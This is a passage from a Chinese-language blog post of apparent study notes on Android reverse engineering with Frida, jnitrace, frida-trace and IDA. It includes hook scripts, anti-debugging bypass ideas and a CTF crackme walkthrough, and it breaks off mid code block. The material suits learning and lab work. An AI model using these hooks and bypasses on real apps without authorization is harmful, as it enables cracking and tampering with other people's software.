Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            Interceptor.attach(addr_775C, &#123;</span><br><span class="line">                onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> name = <span class="keyword">this</span>.context.x0.readCString()</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"addr_775C OnEnter :"</span>, <span class="keyword">this</span>.returnAddress, name);</span><br><span class="line">                &#125;,</span><br><span class="line">                onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"retval is :"</span>, retval) </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(inline_hook())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Attaching...                                                            </span><br><span class="line">libnative_lib_addr: 0x79fabe0000</span><br><span class="line">addr_775C: 0x79fabe775c</span><br><span class="line">TypeError: cannot read property &#39;apply&#39; of undefined</span><br><span class="line">    at [anon] (..&#x2F;..&#x2F;..&#x2F;frida-gum&#x2F;bindings&#x2F;gumjs&#x2F;duktape.c:56618)</span><br><span class="line">    at frida&#x2F;runtime&#x2F;core.js:55</span><br><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; addr_775C OnEnter : 0x79fabe7758 sakura</span><br><span class="line">addr_775C OnEnter : 0x79fabe7758 sakura</span><br></pre></td></tr></table></figure><p>到这里已经可以总结一下我目前的学习了，需要补充一些frida api的学习，比如NativePointr里居然有个readCString，这些API是需要再看看的。</p><h2 id="Frida-native-hook-Frida-hook-native-app实战"><a href="#Frida-native-hook-Frida-hook-native-app实战" class="headerlink" title="Frida native hook : Frida hook native app实战"></a>Frida native hook : Frida hook native app实战</h2><ul><li>破解Frida全端口检测的native层反调试<ul><li>hook libc的pthread_create函数</li></ul></li><li>破解TracePid的native反调试<ul><li>target: <a href="https://gtoad.github.io/2017/06/25/Android-Anti-Debug/" target="_blank" rel="noopener">https://gtoad.github.io/2017/06/25/Android-Anti-Debug/</a></li><li>solve : hook libc的fgets函数</li></ul></li><li>native层修改参数、返回值</li><li>静态分析<code>JNI_Onload</code></li><li>动态trace主动注册 &amp; IDA溯源</li><li>动态trace JNI、libc函数 &amp; IDA溯源</li><li>native层主动调用、打调用栈</li><li>主动调用libc读写文件</li></ul><p>看下logcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n&#x2F;u0a128 for activity com.gdufs.xman&#x2F;.MainActivity</span><br><span class="line">12-28 05:53:26.898 26615 26615 V com.gdufs.xman: JNI_OnLoad()</span><br><span class="line">12-28 05:53:26.898 26615 26615 V com.gdufs.xman: RegisterNatives() --&gt; nativeMethod() ok</span><br><span class="line">12-28 05:53:26.898 26615 26615 D com.gdufs.xman m&#x3D;: 0</span><br><span class="line">12-28 05:53:26.980 26615 26615 D com.gdufs.xman m&#x3D;: Xman</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101517.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101821.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101843.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ frida -U --no-pause -f com.gdufs.xman -l hook_reg.js</span><br><span class="line">...</span><br><span class="line">[Google Pixel::com.gdufs.xman]-&gt; [RegisterNatives] method_count: 0x3</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: initSN sig: ()V fnPtr: 0xd4ddf3b1 module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x13b1</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: saveSN sig: (Ljava&#x2F;lang&#x2F;String;)V fnPtr: 0xd4ddf1f9 module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x11f9</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: work sig: ()V fnPtr: 0xd4ddf4cd module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x14cd</span><br></pre></td></tr></table></figure><ul><li>initSN<br>感觉意思应该是从<code>/sdcard/reg.dat</code>里读一个值，然后和<code>EoPAoY62@ElRD</code>进行比较。<br>最后setValue，从导出函数看一下，最后推测第一个参数应该是JNIEnv *env，然后就看到了给字段m赋值。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-121051.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-102944.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-102844.png" alt=""></li><li>saveSN<br>这个看上去就是根据str的值，去变换”W3_arE_whO_we_ARE”字符串，然后写入到<code>/sdcard/reg.dat</code>里<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-112221.png" alt=""></li></ul><p>结合一下看，只要initSN检查到<code>/sdcard/reg.dat</code>里是<code>EoPAoY62@ElRD</code>，应该就会给m设置成1。<br>只要m的值是1，就能走到work()函数的逻辑。</p><p>参考<a href="https://frida.re/docs/javascript-api/#file" target="_blank" rel="noopener">frida的file api</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="keyword">new</span> File(<span class="string">"/sdcard/reg.dat"</span>,<span class="string">'w'</span>)</span><br><span class="line">    file.write(<span class="string">"EoPAoY62@ElRD"</span>)</span><br><span class="line">    file.flush()</span><br><span class="line">    file.close()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main())</span><br></pre></td></tr></table></figure><p>这样我们继续看work的逻辑<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-120940.png" alt=""></p><p>v2是从getValue得到的，看上去就是m字段的值，此时应该是1，一会hook一下看看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-121012.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[NewStringUTF] bytes:输入即是flag,格式为xman&#123;……&#125;！</span><br></pre></td></tr></table></figure><p>callWork里又调用了work函数，死循环了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-120907.png" alt=""></p><p>那看来看去最后还是回到了initSN，那其实我们看的顺序似乎错了。<br>理一下逻辑，n2执行完保存到文件，然后n1 check一下，所以最后还是要逆n2的算法，pass。</p><h2 id="Frida-trace四件套"><a href="#Frida-trace四件套" class="headerlink" title="Frida trace四件套"></a>Frida trace四件套</h2><h3 id="jni-trace-trace-jni"><a href="#jni-trace-trace-jni" class="headerlink" title="jni trace : trace jni"></a>jni trace : trace jni</h3><p><a href="https://github.com/chame1eon/jnitrace" target="_blank" rel="noopener">https://github.com/chame1eon/jnitrace</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pip install jnitrace</span><br><span class="line"></span><br><span class="line">Requirement already satisfied: frida&gt;&#x3D;12.5.0 in &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages (from jnitrace) (12.8.0)</span><br><span class="line">Requirement already satisfied: colorama in &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages (from jnitrace) (0.4.3)</span><br><span class="line">Collecting hexdump (from jnitrace)</span><br><span class="line">  Downloading https:&#x2F;&#x2F;files.pythonhosted.org&#x2F;packages&#x2F;55&#x2F;b3&#x2F;279b1d57fa3681725d0db8820405cdcb4e62a9239c205e4ceac4391c78e4&#x2F;hexdump-3.3.zip</span><br><span class="line">Installing collected packages: hexdump, jnitrace</span><br><span class="line">  Running setup.py install for hexdump ... done</span><br><span class="line">  Running setup.py install for jnitrace ... done</span><br><span class="line">Successfully installed hexdump-3.3 jnitrace-3.0.8</span><br></pre></td></tr></table></figure><p>usage: <code>jnitrace [options] -l libname target</code><br>默认应该是spawn运行的，</p><ul><li><code>-m</code>来指定是<code>spawn</code>还是<code>attach</code></li><li><code>-b</code>指定是<code>fuzzy</code>还是<code>accurate</code></li><li><code>-i &lt;regex&gt;</code>指定一个正则表达式来过滤出方法名，例如<code>-i Get -i RegisterNatives</code>就会只打印出名字里包含Get或者RegisterNatives的JNI methods。</li><li><code>-e &lt;regex&gt;</code>和<code>-i</code>相反，同样通过正则表达式来过滤，但这次会将指定的内容忽略掉。</li><li><code>-I &lt;string&gt;</code>trace导出的方法，jnitrace认为导出的函数应该是从Java端能够直接调用的函数，所以可以包括使用RegisterNatives来注册的函数，例如<code>-I stringFromJNI -I nativeMethod([B)V</code>，就包括导出名里有stringFromJNI，以及使用RegisterNames来注册，并带有nativeMethod([B)V签名的函数。</li><li><code>-o path/output.json</code>，导出输出到文件里。</li><li><code>-p path/to/script.js</code>，用于在加载jnitrace脚本之前将指定路径的Frida脚本加载到目标进程中，这可以用于在jnitrace启动之前对抗反调试。</li><li><code>-a path/to/script.js</code>，用于在加载jnitrace脚本之后将指定路径的Frida脚本加载到目标进程中</li><li><code>--ignore-env</code>，不打印所有的JNIEnv函数</li><li><code>--ignore-vm</code>，不打印所有的JavaVM函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn&#x2F;0620&#x2F;0620&#x2F;xman&#x2F;resources&#x2F;lib&#x2F;armeabi-v7a$ jnitrace -l libmyjni.so com.gdufs.xman</span><br><span class="line">Tracing. Press any key to quit...</span><br><span class="line">Traced library &quot;libmyjni.so&quot; loaded from path &quot;&#x2F;data&#x2F;app&#x2F;com.gdufs.xman-X0HkzLhbptSc0tjGZ3yQ2g&#x3D;&#x3D;&#x2F;lib&#x2F;arm&quot;.</span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    355 ms [+] JavaVM-&gt;GetEnv</span><br><span class="line">    355 ms |- JavaVM*          : 0xefe99140</span><br><span class="line">    355 ms |- void**           : 0xda13e028</span><br><span class="line">    355 ms |:     0xeff312a0</span><br><span class="line">    355 ms |- jint             : 65542</span><br><span class="line">    355 ms |&#x3D; jint             : 0</span><br><span class="line"></span><br><span class="line">    355 ms ------------------------Backtrace------------------------</span><br><span class="line">    355 ms |-&gt; 0xda13a51b: JNI_OnLoad+0x12 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    529 ms [+] JNIEnv-&gt;FindClass</span><br><span class="line">    529 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    529 ms |- char*            : 0xda13bdef</span><br><span class="line">    529 ms |:     com&#x2F;gdufs&#x2F;xman&#x2F;MyApp</span><br><span class="line">    529 ms |&#x3D; jclass           : 0x81    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line"></span><br><span class="line">    529 ms ------------------------Backtrace------------------------</span><br><span class="line">    529 ms |-&gt; 0xda13a539: JNI_OnLoad+0x30 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    584 ms [+] JNIEnv-&gt;RegisterNatives</span><br><span class="line">    584 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    584 ms |- jclass           : 0x81    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line">    584 ms |- JNINativeMethod* : 0xda13e004</span><br><span class="line">    584 ms |:     0xda13a3b1 - initSN()V</span><br><span class="line">    584 ms |:     0xda13a1f9 - saveSN(Ljava&#x2F;lang&#x2F;String;)V</span><br><span class="line">    584 ms |:     0xda13a4cd - work()V</span><br><span class="line">    584 ms |- jint             : 3</span><br><span class="line">    584 ms |&#x3D; jint             : 0</span><br><span class="line"></span><br><span class="line">    584 ms ------------------------Backtrace------------------------</span><br><span class="line">    584 ms |-&gt; 0xda13a553: JNI_OnLoad+0x4a (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    638 ms [+] JNIEnv-&gt;FindClass</span><br><span class="line">    638 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    638 ms |- char*            : 0xda13bdef</span><br><span class="line">    638 ms |:     com&#x2F;gdufs&#x2F;xman&#x2F;MyApp</span><br><span class="line">    638 ms |&#x3D; jclass           : 0x71    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line"></span><br><span class="line">    638 ms -----------------------Backtrace-----------------------</span><br><span class="line">    638 ms |-&gt; 0xda13a377: setValue+0x12 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    688 ms [+] JNIEnv-&gt;GetStaticFieldID</span><br><span class="line">    688 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    688 ms |- jclass           : 0x71    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line">    688 ms |- char*            : 0xda13be04</span><br><span class="line">    688 ms |:     m</span><br><span class="line">    688 ms |- char*            : 0xda13be06</span><br><span class="line">    688 ms |:     I</span><br><span class="line">    688 ms |&#x3D; jfieldID         : 0xf1165004    &#123; m:I &#125;</span><br><span class="line"></span><br><span class="line">    688 ms -----------------------Backtrace-----------------------</span><br><span class="line">    688 ms |-&gt; 0xda13a38d: setValue+0x28 (libmyjni.so:0xda139000)</span><br></pre></td></tr></table></figure></li></ul><h3 id="strace-trace-syscall"><a href="#strace-trace-syscall" class="headerlink" title="strace : trace syscall"></a>strace : trace syscall</h3><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html</a></p><h3 id="frida-trace-trace-libc-or-more"><a href="#frida-trace-trace-libc-or-more" class="headerlink" title="frida-trace : trace libc(or more)"></a>frida-trace : trace libc(or more)</h3><p><a href="https://frida.re/docs/frida-trace/" target="_blank" rel="noopener">https://frida.re/docs/frida-trace/</a></p><p>Usage:<code>frida-trace [options] target</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i &quot;strcmp&quot; -f com.gdufs.xman</span><br><span class="line">...</span><br><span class="line">  5634 ms  strcmp(s1&#x3D;&quot;fi&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;da&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;es&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;eu-ES&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;et-EE&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;et-EE&quot;, s2&#x3D;&quot;es-US&quot;)</span><br></pre></td></tr></table></figure><ul><li>art trace: <a href="https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js" target="_blank" rel="noopener">hook artmethod</a></li></ul><h3 id="hook-artmethod-trace-java函数调用"><a href="#hook-artmethod-trace-java函数调用" class="headerlink" title="hook_artmethod : trace java函数调用"></a>hook_artmethod : trace java函数调用</h3><p><a href="https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js" target="_blank" rel="noopener">https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js</a></p><h3 id="修改AOSP源码打印"><a href="#修改AOSP源码打印" class="headerlink" title="修改AOSP源码打印"></a>修改AOSP源码打印</h3><p><a href="https://bbs.pediy.com/thread-255653-1.htm" target="_blank" rel="noopener">改aosp源码trace信息</a></p><h2 id="Frida-native-hook-init-array开发和自动化逆向"><a href="#Frida-native-hook-init-array开发和自动化逆向" class="headerlink" title="Frida native hook : init_array开发和自动化逆向"></a>Frida native hook : init_array开发和自动化逆向</h2><h3 id="init-array原理"><a href="#init-array原理" class="headerlink" title="init_array原理"></a>init_array原理</h3><p>常见的保护都会在init_array里面做，关于其原理，主要阅读以下文章即可。</p><ul><li><a href="https://www.cnblogs.com/bingghost/p/6297325.html" target="_blank" rel="noopener">IDA调试android so的.init_array数组</a></li><li><a href="https://www.dllhook.com/post/213.html" target="_blank" rel="noopener">Android NDK中.init段和.init_array段函数的定义方式</a></li><li><a href="https://wooyun.js.org/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">Linker学习笔记</a></li></ul><h3 id="IDA静态分析init-array"><a href="#IDA静态分析init-array" class="headerlink" title="IDA静态分析init_array"></a>IDA静态分析init_array</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译生成后在.init段 [名字不可更改]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="keyword">void</span> _init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    LOGD(<span class="string">"Enter init......"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译生成后在.init_array段 [名字可以更改]</span></span><br><span class="line">__attribute__((__constructor__)) <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sakura_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOGD(<span class="string">"Enter sakura_init......"</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">2016</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">51</span>:<span class="number">23.017</span> <span class="number">5160</span><span class="number">-5160</span>/com.example.ndk_demo D/sakura1328: Enter init......</span><br><span class="line"><span class="number">2016</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">51</span>:<span class="number">23.017</span> <span class="number">5160</span><span class="number">-5160</span>/com.example.ndk_demo D/sakura1328: Enter sakura_init......</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161438.png" alt=""><br>IDA快捷键<code>shift+F7</code>找到segment，然后就可以找到<code>.init_array</code>段，然后就可以找到里面保存的函数地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161519.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161601.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161613.png" alt=""></p><h3 id="IDA动态调试so"><a href="#IDA动态调试so" class="headerlink" title="IDA动态调试so"></a>IDA动态调试so</h3><ul><li><p>打开要调试的apk，找到入口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;.gradle&#x2F;caches$ adb shell dumpsys activity top | grep TASK</span><br><span class="line">TASK com.android.systemui id&#x3D;29 userId&#x3D;0</span><br><span class="line">TASK null id&#x3D;26 userId&#x3D;0</span><br><span class="line">TASK com.example.ndk_demo id&#x3D;161 userId&#x3D;0</span><br></pre></td></tr></table></figure></li><li><p>启动apk,并让设备将处于一个Waiting For Debugger的状态<br><code>adb shell am start -D -n com.example.ndk_demo/.MainActivity</code></p></li><li><p>执行android_server64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sailfish:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;android_server64</span><br><span class="line">IDA Android 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure></li><li><p>新开一个窗口使用forward程序进行端口转发：<code>adb forward tcp:23946 tcp:23946</code></p></li></ul><p><code>adb  forward  tcp:&lt;本地机器的网络端口号&gt;  tcp:&lt;模拟器或是真机的网络端口号&gt;</code><br>例:adb [-d|-e|-s <serialNumber>] forward tcp:6100 tcp:7100 表示把本机的6100端口号与模拟器的7100端口建立起相关，当模拟器或真机向自己的7100端口发送了数据，那们我们可以在本机的6100端口读取其发送的内容，这是一个很关键的命令，以后我们使用jdb调试apk之前，就要用它先把目标进程和本地端口建立起关联</p><ul><li><p>打开IDA，选择菜单Debugger -&gt; Attach -&gt; Remote ARM Linux/Android debugger</p></li><li><p>打开IDA，选择菜单Debugger -&gt; Process options, 填好，然后选择进程去attach。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-082029.png" alt=""></p></li><li><p>查看待调试的进程<code>adb jdwp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ adb jdwp</span><br><span class="line">10436</span><br></pre></td></tr></table></figure></li><li><p>转发端口<code>adb forward tcp:8700 jdwp:10436</code>，将该进程的调试端口和本机的8700绑定。</p></li><li><p>jdb连接调试端口，从而让程序继续运行 <code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></p></li><li><p>找到断点并断下。</p></li></ul><p>打开module<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-095937.png" alt=""><br>找到linker64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-095955.png" alt=""><br>找到call array函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-100022.png" alt=""><br>下断并按F9断下<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-100042.png" alt=""></p><p>最终我确实可以调试到<code>.init_array</code>的初始化，具体的代码分析见<a href="https://wooyun.js.org/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">Linker学习笔记</a>这里。</p><h3 id="init-array-amp-amp-JNI-Onload-“自吐”"><a href="#init-array-amp-amp-JNI-Onload-“自吐”" class="headerlink" title="init_array &amp;&amp; JNI_Onload “自吐”"></a>init_array &amp;&amp; JNI_Onload “自吐”</h3><h4 id="JNI-Onload"><a href="#JNI-Onload" class="headerlink" title="JNI_Onload"></a>JNI_Onload</h4><p>目标是找到动态注册的函数的地址，因为这种函数没有导出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JNINativeMethod methods[] = &#123;</span><br><span class="line">            &#123;<span class="string">"stringFromJNI2"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) stringFromJNI2&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    env-&gt;RegisterNatives(env-&gt;FindClass(<span class="string">"com/example/ndk_demo/MainActivity"</span>), methods,</span><br><span class="line">                         <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>首先<code>jnitrace -m spawn -i &quot;RegisterNatives&quot; -l libnative-lib.so com.example.ndk_demo</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">525 ms [+] JNIEnv-&gt;RegisterNatives</span><br><span class="line">525 ms |- JNIEnv*          : 0x7a106cc1c0</span><br><span class="line">525 ms |- jclass           : 0x89    &#123; com&#x2F;example&#x2F;ndk_demo&#x2F;MainActivity &#125;</span><br><span class="line">525 ms |- JNINativeMethod* : 0x7ff0b71120</span><br><span class="line">525 ms |:     0x79f00d36b0 - stringFromJNI2()Ljava&#x2F;lang&#x2F;String;</span><br></pre></td></tr></table></figure><p>然后<code>objection -d -g com.example.ndk_demo run memory list modules explore | grep demo</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -d -g com.example.ndk_demo run memory list modules explore | grep demo</span><br><span class="line">[debug] Attempting to attach to process: &#96;com.example.ndk_demo&#96;</span><br><span class="line">Warning: Output is not to a terminal (fd&#x3D;1).</span><br><span class="line">base.odex                                        0x79f0249000  106496 (104.0 KiB)    &#x2F;data&#x2F;app&#x2F;com.example.ndk_demo-HGAFhnKyKCSIpzn227pwXw&#x3D;&#x3D;&#x2F;oat&#x2F;arm64&#x2F;base.odex</span><br><span class="line">libnative-lib.so                                 0x79f00c4000  221184 (216.0 KiB)    &#x2F;data&#x2F;app&#x2F;com.example.ndk_demo-HGAFhnKyKCSIpzn227pwXw&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libnative...</span><br></pre></td></tr></table></figure><p>offset = 0x79f00d36b0 - 0x79f00c4000 = 0xf6b0</p><p>这样就找到了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-122151.png" alt=""></p><h4 id="init-array"><a href="#init-array" class="headerlink" title="init_array"></a>init_array</h4><p>没有支持arm64，可以在安装app的时候<code>adb install --abi armeabi-v7a</code>强制让app运行在32位模式</p><p>这个脚本整体来说就是hook callfunction，然后打印出init_array里面的函数地址和参数等。</p><p>从源码看，关键就是call_array这里调用的call_function，第一个参数代表这是注册的init_array里面的function，第二个参数则是init_array里存储的函数的地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 